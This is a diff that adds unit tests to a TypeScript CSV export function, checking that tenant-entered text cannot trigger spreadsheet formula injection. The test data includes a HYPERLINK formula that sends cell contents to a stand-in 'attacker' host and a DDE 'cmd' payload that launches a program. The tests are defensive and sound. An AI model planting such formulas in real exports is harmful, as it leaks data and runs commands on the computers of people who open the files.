@@ -77,4 +77,39 @@ describe('toBoqCsv', () => {
     const row = csv.split('\r\n')[1]!;
     expect(row.startsWith('3,,,ITM-01,')).toBe(true);
   });
+
+  // ── CSV formula injection (CWE-1236) ──────────────────────────────────────
+  // description/item_code/unit are tenant-authored free text and this file is downloaded and opened
+  // in a spreadsheet. RFC 4180 quoting alone does not stop evaluation — the quotes are stripped first.
+
+  it.each([
+    ['=HYPERLINK("http://attacker/?d="&A1,"Open")'],
+    ['@SUM(A1:A9)'],
+    ['\tcmd'],
+    ["-1+1+cmd|'/c calc'!A0"],
+    ['+1+1'],
+  ])('neutralises the formula trigger in %s', (payload) => {
+    const csv = toBoqCsv(version, [category], [makeItem({ description: payload })]);
+    const row = csv.split('\r\n')[1]!;
+    // Quoted and apostrophe-prefixed → the spreadsheet renders it as literal text.
+    expect(row).toContain(`"'${payload.replace(/"/g, '""')}"`);
+  });
+
+  it('leaves signed numbers alone — escaping them would break the export as data', () => {
+    const csv = toBoqCsv(
+      version,
+      [category],
+      [makeItem({ unit_cost: '-150.0000', carbon_factor_kg_co2e: '+0.500000' })],
+    );
+    const row = csv.split('\r\n')[1]!;
+    expect(row).toContain(',-150.0000,');
+    expect(row).toContain(',+0.500000,');
+    expect(row).not.toContain("'");
+  });
+
+  it('still applies plain RFC 4180 quoting to non-formula text', () => {
+    const csv = toBoqCsv(version, [category], [makeItem({ description: 'Rebar, 12mm' })]);
+    expect(csv.split('\r\n')[1]!).toContain('"Rebar, 12mm"');
+    expect(csv).not.toContain("'");
+  });
 });
